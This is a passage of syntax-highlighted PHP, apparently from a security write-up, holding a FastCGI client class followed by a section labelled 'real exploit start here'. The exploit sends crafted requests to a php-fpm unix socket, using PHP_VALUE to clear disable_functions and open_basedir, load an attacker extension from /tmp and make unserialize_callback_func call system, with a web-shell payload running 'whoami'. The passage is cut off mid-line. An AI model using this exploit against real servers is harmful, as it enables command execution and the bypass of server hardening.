class="number">10</span>;</span><br><span class="line">    <span class="keyword">const</span> UNKNOWN_TYPE         = <span class="number">11</span>;</span><br><span class="line">    <span class="keyword">const</span> MAXTYPE              = <span class="built_in">self</span>::UNKNOWN_TYPE;</span><br><span class="line">    <span class="keyword">const</span> RESPONDER            = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">const</span> AUTHORIZER           = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">const</span> FILTER               = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">const</span> REQUEST_COMPLETE     = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">const</span> CANT_MPX_CONN        = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">const</span> OVERLOADED           = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">const</span> UNKNOWN_ROLE         = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">const</span> MAX_CONNS            = <span class="string">&#x27;MAX_CONNS&#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> MAX_REQS             = <span class="string">&#x27;MAX_REQS&#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> MPXS_CONNS           = <span class="string">&#x27;MPXS_CONNS&#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> HEADER_LEN           = <span class="number">8</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Socket</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> Resource</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_sock</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Host</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> String</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_host</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Port</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> Integer</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_port</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Keep Alive</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> Boolean</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_keepAlive</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Constructor</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $host Host of the FastCGI application</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> Integer $port Port of the FastCGI application</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$host</span>, <span class="variable">$port</span> = <span class="number">9001</span></span>) // <span class="title">and</span> <span class="title">default</span> <span class="title">value</span> <span class="title">for</span> <span class="title">port</span>, <span class="title">just</span> <span class="title">for</span> <span class="title">unixdomain</span> <span class="title">socket</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_host = <span class="variable">$host</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_port = <span class="variable">$port</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Define whether or not the FastCGI application should keep the connection</span></span><br><span class="line"><span class="comment">     * alive at the end of a request</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> Boolean $b true if the connection should stay alive, false otherwise</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setKeepAlive</span>(<span class="params"><span class="variable">$b</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_keepAlive = (<span class="keyword">boolean</span>)<span class="variable">$b</span>;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;_keepAlive &amp;&amp; <span class="keyword">$this</span>-&gt;_sock) &#123;</span><br><span class="line">            fclose(<span class="keyword">$this</span>-&gt;_sock);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Get the keep alive status</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> Boolean true if the connection should stay alive, false otherwise</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getKeepAlive</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;_keepAlive;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Create a connection to the FastCGI application</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">connect</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;_sock) &#123;</span><br><span class="line">            <span class="comment">//$this-&gt;_sock = fsockopen($this-&gt;_host, $this-&gt;_port, $errno, $errstr, 5);</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;_sock = stream_socket_client(<span class="keyword">$this</span>-&gt;_host, <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="number">5</span>);</span><br><span class="line">            <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;_sock) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;Unable to connect to FastCGI application&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Build a FastCGI packet</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> Integer $type Type of the packet</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $content Content of the packet</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> Integer $requestId RequestId</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">buildPacket</span>(<span class="params"><span class="variable">$type</span>, <span class="variable">$content</span>, <span class="variable">$requestId</span> = <span class="number">1</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$clen</span> = strlen(<span class="variable">$content</span>);</span><br><span class="line">        <span class="keyword">return</span> chr(<span class="built_in">self</span>::VERSION_1)         <span class="comment">/* version */</span></span><br><span class="line">            . chr(<span class="variable">$type</span>)                    <span class="comment">/* type */</span></span><br><span class="line">            . chr((<span class="variable">$requestId</span> &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) <span class="comment">/* requestIdB1 */</span></span><br><span class="line">            . chr(<span class="variable">$requestId</span> &amp; <span class="number">0xFF</span>)        <span class="comment">/* requestIdB0 */</span></span><br><span class="line">            . chr((<span class="variable">$clen</span> &gt;&gt; <span class="number">8</span> ) &amp; <span class="number">0xFF</span>)     <span class="comment">/* contentLengthB1 */</span></span><br><span class="line">            . chr(<span class="variable">$clen</span> &amp; <span class="number">0xFF</span>)             <span class="comment">/* contentLengthB0 */</span></span><br><span class="line">            . chr(<span class="number">0</span>)                        <span class="comment">/* paddingLength */</span></span><br><span class="line">            . chr(<span class="number">0</span>)                        <span class="comment">/* reserved */</span></span><br><span class="line">            . <span class="variable">$content</span>;                     <span class="comment">/* content */</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Build an FastCGI Name value pair</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $name Name</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $value Value</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> String FastCGI Name value pair</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">buildNvpair</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$nlen</span> = strlen(<span class="variable">$name</span>);</span><br><span class="line">        <span class="variable">$vlen</span> = strlen(<span class="variable">$value</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$nlen</span> &lt; <span class="number">128</span>) &#123;</span><br><span class="line">            <span class="comment">/* nameLengthB0 */</span></span><br><span class="line">            <span class="variable">$nvpair</span> = chr(<span class="variable">$nlen</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">/* nameLengthB3 &amp; nameLengthB2 &amp; nameLengthB1 &amp; nameLengthB0 */</span></span><br><span class="line">            <span class="variable">$nvpair</span> = chr((<span class="variable">$nlen</span> &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) . chr((<span class="variable">$nlen</span> &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) . chr((<span class="variable">$nlen</span> &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) . chr(<span class="variable">$nlen</span> &amp; <span class="number">0xFF</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$vlen</span> &lt; <span class="number">128</span>) &#123;</span><br><span class="line">            <span class="comment">/* valueLengthB0 */</span></span><br><span class="line">            <span class="variable">$nvpair</span> .= chr(<span class="variable">$vlen</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">/* valueLengthB3 &amp; valueLengthB2 &amp; valueLengthB1 &amp; valueLengthB0 */</span></span><br><span class="line">            <span class="variable">$nvpair</span> .= chr((<span class="variable">$vlen</span> &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) . chr((<span class="variable">$vlen</span> &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) . chr((<span class="variable">$vlen</span> &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) . chr(<span class="variable">$vlen</span> &amp; <span class="number">0xFF</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/* nameData &amp; valueData */</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$nvpair</span> . <span class="variable">$name</span> . <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Read a set of FastCGI Name value pairs</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $data Data containing the set of FastCGI NVPair</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array of NVPair</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">readNvpair</span>(<span class="params"><span class="variable">$data</span>, <span class="variable">$length</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$array</span> = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$length</span> === <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="variable">$length</span> = strlen(<span class="variable">$data</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$p</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (<span class="variable">$p</span> != <span class="variable">$length</span>) &#123;</span><br><span class="line">            <span class="variable">$nlen</span> = ord(<span class="variable">$data</span>&#123;<span class="variable">$p</span>++&#125;);</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$nlen</span> &gt;= <span class="number">128</span>) &#123;</span><br><span class="line">                <span class="variable">$nlen</span> = (<span class="variable">$nlen</span> &amp; <span class="number">0x7F</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">                <span class="variable">$nlen</span> |= (ord(<span class="variable">$data</span>&#123;<span class="variable">$p</span>++&#125;) &lt;&lt; <span class="number">16</span>);</span><br><span class="line">                <span class="variable">$nlen</span> |= (ord(<span class="variable">$data</span>&#123;<span class="variable">$p</span>++&#125;) &lt;&lt; <span class="number">8</span>);</span><br><span class="line">                <span class="variable">$nlen</span> |= (ord(<span class="variable">$data</span>&#123;<span class="variable">$p</span>++&#125;));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$vlen</span> = ord(<span class="variable">$data</span>&#123;<span class="variable">$p</span>++&#125;);</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$vlen</span> &gt;= <span class="number">128</span>) &#123;</span><br><span class="line">                <span class="variable">$vlen</span> = (<span class="variable">$nlen</span> &amp; <span class="number">0x7F</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">                <span class="variable">$vlen</span> |= (ord(<span class="variable">$data</span>&#123;<span class="variable">$p</span>++&#125;) &lt;&lt; <span class="number">16</span>);</span><br><span class="line">                <span class="variable">$vlen</span> |= (ord(<span class="variable">$data</span>&#123;<span class="variable">$p</span>++&#125;) &lt;&lt; <span class="number">8</span>);</span><br><span class="line">                <span class="variable">$vlen</span> |= (ord(<span class="variable">$data</span>&#123;<span class="variable">$p</span>++&#125;));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$array</span>[substr(<span class="variable">$data</span>, <span class="variable">$p</span>, <span class="variable">$nlen</span>)] = substr(<span class="variable">$data</span>, <span class="variable">$p</span>+<span class="variable">$nlen</span>, <span class="variable">$vlen</span>);</span><br><span class="line">            <span class="variable">$p</span> += (<span class="variable">$nlen</span> + <span class="variable">$vlen</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$array</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Decode a FastCGI Packet</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $data String containing all the packet</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">decodePacketHeader</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ret</span> = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable">$ret</span>[<span class="string">&#x27;version&#x27;</span>]       = ord(<span class="variable">$data</span>&#123;<span class="number">0</span>&#125;);</span><br><span class="line">        <span class="variable">$ret</span>[<span class="string">&#x27;type&#x27;</span>]          = ord(<span class="variable">$data</span>&#123;<span class="number">1</span>&#125;);</span><br><span class="line">        <span class="variable">$ret</span>[<span class="string">&#x27;requestId&#x27;</span>]     = (ord(<span class="variable">$data</span>&#123;<span class="number">2</span>&#125;) &lt;&lt; <span class="number">8</span>) + ord(<span class="variable">$data</span>&#123;<span class="number">3</span>&#125;);</span><br><span class="line">        <span class="variable">$ret</span>[<span class="string">&#x27;contentLength&#x27;</span>] = (ord(<span class="variable">$data</span>&#123;<span class="number">4</span>&#125;) &lt;&lt; <span class="number">8</span>) + ord(<span class="variable">$data</span>&#123;<span class="number">5</span>&#125;);</span><br><span class="line">        <span class="variable">$ret</span>[<span class="string">&#x27;paddingLength&#x27;</span>] = ord(<span class="variable">$data</span>&#123;<span class="number">6</span>&#125;);</span><br><span class="line">        <span class="variable">$ret</span>[<span class="string">&#x27;reserved&#x27;</span>]      = ord(<span class="variable">$data</span>&#123;<span class="number">7</span>&#125;);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$ret</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Read a FastCGI Packet</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">readPacket</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$packet</span> = fread(<span class="keyword">$this</span>-&gt;_sock, <span class="built_in">self</span>::HEADER_LEN)) &#123;</span><br><span class="line">            <span class="variable">$resp</span> = <span class="keyword">$this</span>-&gt;decodePacketHeader(<span class="variable">$packet</span>);</span><br><span class="line">            <span class="variable">$resp</span>[<span class="string">&#x27;content&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$resp</span>[<span class="string">&#x27;contentLength&#x27;</span>]) &#123;</span><br><span class="line">                <span class="variable">$len</span>  = <span class="variable">$resp</span>[<span class="string">&#x27;contentLength&#x27;</span>];</span><br><span class="line">                <span class="keyword">while</span> (<span class="variable">$len</span> &amp;&amp; <span class="variable">$buf</span>=fread(<span class="keyword">$this</span>-&gt;_sock, <span class="variable">$len</span>)) &#123;</span><br><span class="line">                    <span class="variable">$len</span> -= strlen(<span class="variable">$buf</span>);</span><br><span class="line">                    <span class="variable">$resp</span>[<span class="string">&#x27;content&#x27;</span>] .= <span class="variable">$buf</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$resp</span>[<span class="string">&#x27;paddingLength&#x27;</span>]) &#123;</span><br><span class="line">                <span class="variable">$buf</span>=fread(<span class="keyword">$this</span>-&gt;_sock, <span class="variable">$resp</span>[<span class="string">&#x27;paddingLength&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$resp</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Get Informations on the FastCGI application</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> array $requestedInfo information to retrieve</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getValues</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$requestedInfo</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;connect();</span><br><span class="line">        <span class="variable">$request</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$requestedInfo</span> <span class="keyword">as</span> <span class="variable">$info</span>) &#123;</span><br><span class="line">            <span class="variable">$request</span> .= <span class="keyword">$this</span>-&gt;buildNvpair(<span class="variable">$info</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        fwrite(<span class="keyword">$this</span>-&gt;_sock, <span class="keyword">$this</span>-&gt;buildPacket(<span class="built_in">self</span>::GET_VALUES, <span class="variable">$request</span>, <span class="number">0</span>));</span><br><span class="line">        <span class="variable">$resp</span> = <span class="keyword">$this</span>-&gt;readPacket();</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$resp</span>[<span class="string">&#x27;type&#x27;</span>] == <span class="built_in">self</span>::GET_VALUES_RESULT) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;readNvpair(<span class="variable">$resp</span>[<span class="string">&#x27;content&#x27;</span>], <span class="variable">$resp</span>[<span class="string">&#x27;length&#x27;</span>]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;Unexpected response type, expecting GET_VALUES_RESULT&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Execute a request to the FastCGI application</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> array $params Array of parameters</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $stdin Content</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> String</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">request</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$params</span>, <span class="variable">$stdin</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$response</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="comment">//        $this-&gt;connect();</span></span><br><span class="line">        <span class="variable">$request</span> = <span class="keyword">$this</span>-&gt;buildPacket(<span class="built_in">self</span>::BEGIN_REQUEST, chr(<span class="number">0</span>) . chr(<span class="built_in">self</span>::RESPONDER) . chr((<span class="keyword">int</span>) <span class="keyword">$this</span>-&gt;_keepAlive) . str_repeat(chr(<span class="number">0</span>), <span class="number">5</span>));</span><br><span class="line">        <span class="variable">$paramsRequest</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$params</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">            <span class="variable">$paramsRequest</span> .= <span class="keyword">$this</span>-&gt;buildNvpair(<span class="variable">$key</span>, <span class="variable">$value</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$paramsRequest</span>) &#123;</span><br><span class="line">            <span class="variable">$request</span> .= <span class="keyword">$this</span>-&gt;buildPacket(<span class="built_in">self</span>::PARAMS, <span class="variable">$paramsRequest</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$request</span> .= <span class="keyword">$this</span>-&gt;buildPacket(<span class="built_in">self</span>::PARAMS, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$stdin</span>) &#123;</span><br><span class="line">            <span class="variable">$request</span> .= <span class="keyword">$this</span>-&gt;buildPacket(<span class="built_in">self</span>::STDIN, <span class="variable">$stdin</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$request</span> .= <span class="keyword">$this</span>-&gt;buildPacket(<span class="built_in">self</span>::STDIN, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&#x27;data=&#x27;</span>.urlencode(<span class="variable">$request</span>));</span><br><span class="line"><span class="comment">//        fwrite($this-&gt;_sock, $request);</span></span><br><span class="line"><span class="comment">//        do &#123;</span></span><br><span class="line"><span class="comment">//            $resp = $this-&gt;readPacket();</span></span><br><span class="line"><span class="comment">//            if ($resp[&#x27;type&#x27;] == self::STDOUT || $resp[&#x27;type&#x27;] == self::STDERR) &#123;</span></span><br><span class="line"><span class="comment">//                $response .= $resp[&#x27;content&#x27;];</span></span><br><span class="line"><span class="comment">//            &#125;</span></span><br><span class="line"><span class="comment">//        &#125; while ($resp &amp;&amp; $resp[&#x27;type&#x27;] != self::END_REQUEST);</span></span><br><span class="line"><span class="comment">//        var_dump($resp);</span></span><br><span class="line"><span class="comment">//        if (!is_array($resp)) &#123;</span></span><br><span class="line"><span class="comment">//            throw new Exception(&#x27;Bad request&#x27;);</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"><span class="comment">//        switch (ord($resp[&#x27;content&#x27;]&#123;4&#125;)) &#123;</span></span><br><span class="line"><span class="comment">//            case self::CANT_MPX_CONN:</span></span><br><span class="line"><span class="comment">//                throw new Exception(&#x27;This app can\&#x27;t multiplex [CANT_MPX_CONN]&#x27;);</span></span><br><span class="line"><span class="comment">//                break;</span></span><br><span class="line"><span class="comment">//            case self::OVERLOADED:</span></span><br><span class="line"><span class="comment">//                throw new Exception(&#x27;New request rejected; too busy [OVERLOADED]&#x27;);</span></span><br><span class="line"><span class="comment">//                break;</span></span><br><span class="line"><span class="comment">//            case self::UNKNOWN_ROLE:</span></span><br><span class="line"><span class="comment">//                throw new Exception(&#x27;Role value not known [UNKNOWN_ROLE]&#x27;);</span></span><br><span class="line"><span class="comment">//                break;</span></span><br><span class="line"><span class="comment">//            case self::REQUEST_COMPLETE:</span></span><br><span class="line"><span class="comment">//                return $response;</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// real exploit start here</span></span><br><span class="line"><span class="comment">//if (!isset($_REQUEST[&#x27;cmd&#x27;])) &#123;</span></span><br><span class="line"><span class="comment">//    die(&quot;Check your input\n&quot;);</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//if (!isset($_REQUEST[&#x27;filepath&#x27;])) &#123;</span></span><br><span class="line"><span class="comment">//    $filepath = __FILE__;</span></span><br><span class="line"><span class="comment">//&#125;else&#123;</span></span><br><span class="line"><span class="comment">//    $filepath = $_REQUEST[&#x27;filepath&#x27;];</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$filepath</span> = <span class="string">&quot;/var/www/html/add_api.php&quot;</span>;</span><br><span class="line"><span class="variable">$req</span> = <span class="string">&#x27;/&#x27;</span>.basename(<span class="variable">$filepath</span>);</span><br><span class="line"><span class="variable">$uri</span> = <span class="variable">$req</span> .<span class="string">&#x27;?&#x27;</span>.<span class="string">&#x27;command=whoami&#x27;</span>;</span><br><span class="line"><span class="variable">$client</span> = <span class="keyword">new</span> FCGIClient(<span class="string">&quot;unix:///var/run/php-fpm.sock&quot;</span>, -<span class="number">1</span>);</span><br><span class="line"><span class="variable">$code</span> = <span class="string">&quot;&lt;?php system(\$_REQUEST[&#x27;command&#x27;]); phpinfo(); ?&gt;&quot;</span>; <span class="comment">// php payload -- Doesnt do anything</span></span><br><span class="line"><span class="variable">$php_value</span> = <span class="string">&quot;unserialize_callback_func = system\nextension_dir = /tmp\nextension = hpdoger.so\ndisable_classes = \ndisable_functions = \nallow_url_include = On\nopen_basedir = /\nauto_prepend_file = &quot;</span>;</span><br><span class="line"><span class="variable">$params</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;GATEWAY_INTERFACE&#x27;</span> =&gt; <span class="string">&#x27;FastCGI/1.0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;REQUEST_METHOD&#x27;</span>    =&gt; <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SCRIPT_FILENAME&#x27;</span>   =&gt; <span class="variable">$filepath</span>,</span><br><span class="line">    <span class="string">&#x27;SCRIPT_NAME&#x27;</span>       =&gt; <span class="variable">$req</span>,</span><br><span class="line">    <span class="string">&#x27;QUERY_STRING&#x27;</span>      =&gt; <span class="string">&#x27;command=whoami&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;REQUEST_URI&#x27;</span>       =&gt; <span class="variable">$uri</span>,</span><br><span class="line">    <span class="string">&#x27;DOCUMENT_URI&#x27;</span>      =&gt; <span class="variable">$req</span>,</span><br><span class="line"><span class="comment">#&#x27;DOCUMENT_ROOT&#x27;     =&gt; &#x27;/&#x27;,</span></span><br><span class="line">    <span class="string">&#x27;PHP_VALUE&#x27;</span>         =&gt; <span class="variable">$php_value</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_SOFTWARE&#x27;</span>   =&gt; <span class="string">&#x27;80sec/wofeiwo&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;REMOTE_ADDR&#x27;</span>       =&gt; <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;REMOTE_PORT&#x27;</span>       =&gt; <span class="string">&#x27;9001&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_ADDR&#x27;</span>       =&gt; <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_PORT&#x27;</span>       =&gt; <span class="string">&#x27;80&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_NAME&#x27;</span>       =&gt; <span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_PROTOCOL&#x27;</span>   =&gt; <span class="string">&#x27;HTTP/1.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;CONTENT_LENGTH&#x27;</span>    =&gt; strlen(<span class="variable">$code</span>)</span><br><span class="line">);</span><br><span class="line"><span class="comment">// print_r($_REQUEST);</span></span><br><span class="line"><span class="comment">// print_r($params);</span></span><br><span class="line"><span class="comment">//echo &quot;Call: $uri\n\n&quot;;</span></span><br><span class="line"><span 